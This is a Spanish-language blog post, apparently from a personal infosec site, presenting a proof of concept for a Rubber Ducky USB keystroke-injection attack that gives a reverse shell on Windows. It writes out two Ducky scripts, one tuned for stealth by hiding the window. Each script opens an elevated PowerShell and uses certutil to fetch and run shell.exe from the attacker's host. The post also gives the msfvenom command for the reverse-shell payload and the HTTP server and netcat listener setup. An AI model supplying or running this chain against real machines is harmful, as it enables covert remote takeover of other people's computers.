---
layout: single
title: POC Rubber Ducky Rev Shell
excerpt: "Buenas! Hoy os voy a compartir como utilizar una herramienta de Hak5, aunque también se puede hacer de forma casera, en mi caso es el RubberDucky de Hak5."
date: 2021-09-20
classes: wide
header:
  teaser: /assets/images/RubberDuckyRevShell/Untitled.png
  teaser_home_page: true
  icon: 
categories:
  - POC RubberDucky
  - infosec
tags:
  -   POC
  -   Video
  -   RubberDucky
  -   Reverse Shell
---

# Rubber Ducky Rev Shell

![Untitled](/assets/images/RubberDuckyRevShell/Untitled.png)

Buenas! Hoy os voy a compartir como utilizar una herramienta de Hak5, aunque también se puede hacer de forma casera, en mi caso es el RubberDucky de Hak5.

El RubberDucky se compone de estos elementos:

![Untitled](/assets/images/RubberDuckyRevShell/Untitled%201.png)

El 1º elemento es una tarjeta MicroSD de 128mb en este caso

El 2º elemento es el dispositivo que voy a usar para controlar los archivos que quiero meter en la tarjeta MicroSD

El 3º elemento es el RubberDucky desenfundado, una vez que este todo listo metemos la tarjeta en el Rubberducky y ya esta listo para la acción.

 Su uso es muy sencillo, os lo voy a explicar en los siguientes pasos:

## 1º Paso

En este caso voy a programar una reverse shell a mi equipo en el Rubberducky, por lo que nos iremos a la pagina → [https://ducktoolkit.com/encode#](https://ducktoolkit.com/encode#)

Y programaremos los comandos que se van a ejecutar cuando ingresemos el RubberDucky:

![Untitled](/assets/images/RubberDuckyRevShell/Untitled%202.png)

En la primera parte ingresaremos nuestro código:

```powershell
DELAY 750
GUI r
DELAY 1000
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 750
STRING certutil.exe -urlcache -f http://192.168.234.130/shell.exe C:\Windows\Temp\shell.exe
ENTER
DELAY 500
STRING Start-Process -FilePath "C:\Windows\Temp\shell.exe"
ENTER
```

Con `DELAY` → Hacemos que el programa espere cierta cantidad de tiempo

Con `GUI r` → Seria el equivalente a Windows + R

Con `STRING` → Le decimos que comando queremos escribir

Con `Enter` → Hace la función de la tecla ↲

Una vez terminado el script, seleccionamos el idioma

Le damos a Encode Payload

Y nos lo descargamos

## 2º Paso

En nuestra maquina atacante nos crearemos el binario malicioso, en este caso con la herramienta `msfvenom` 

`msfvenom -p windows/shell_reverse_tcp lhost=192.168.234.130 lport=443 -f exe > shell.exe`

```bash
root@kali /home/kali/Desktop/POCRubberDucky
❯ msfvenom -p windows/shell_reverse_tcp lhost=192.168.234.130 lport=443 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Nos compartimos un servidor http con `python` y nos ponemos en escucha con `netcat`

```bash
root@kali /home/kali/Desktop/POCRubberDucky
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

─────────────────────────────────────────────────────────────────────────────────────────────
root@kali /home/kali/Desktop/POCRubberDucky
❯ rlwrap nc -nlvp 443                  
listening on [any] 443 ...
```

## 3º Paso

Meter el inject.bin descargado en la MicroSD

![Untitled](/assets/images/RubberDuckyRevShell/Untitled%203.png)

Sacamos la MicroSD y la metemos en el RubberDucky:

![Untitled](/assets/images/RubberDuckyRevShell/Untitled%204.png)

## 4º Paso

Metemos el RubberDucky al sistema Windows que queremos vulnerar:

<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/coCoG7R6XKw" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

De esta forma conseguimos ganar acceso a un sistema en tan solo 10 segundos.

Pero si os dais cuenta, en el sistema Windows se quedan las terminales abiertas y se ven como se ejecutan los comandos, una forma mas sigilosa y mas rapida seria programar el script de esta forma:

```powershell
DELAY 750
GUI r
DELAY 500
STRING powershell Start-Process powershell -Verb runAs
ENTER
ALT y
DELAY 400
ENTER
ALT SPACE
DELAY 300
STRING m
DELAY 300
DOWNARROW
REPEAT 100
ENTER
STRING certutil.exe -urlcache -f http://192.168.234.130/shell.exe C:\Windows\Temp\shell.exe
ENTER
DELAY 300
STRING Start-Process -FilePath "C:\Windows\Temp\shell.exe"
ENTER
STRING exit
ENTER
```

![Untitled](/assets/images/RubberDuckyRevShell/Untitled%205.png)

Se ejecutaría de esta forma:

<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/lKdGUfEHlO8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

Como vemos es una herramienta muy sencilla de utilizar, espero que os haya gustado, si veo que a la gente le gusta quizás traiga otros scripts mas adelante.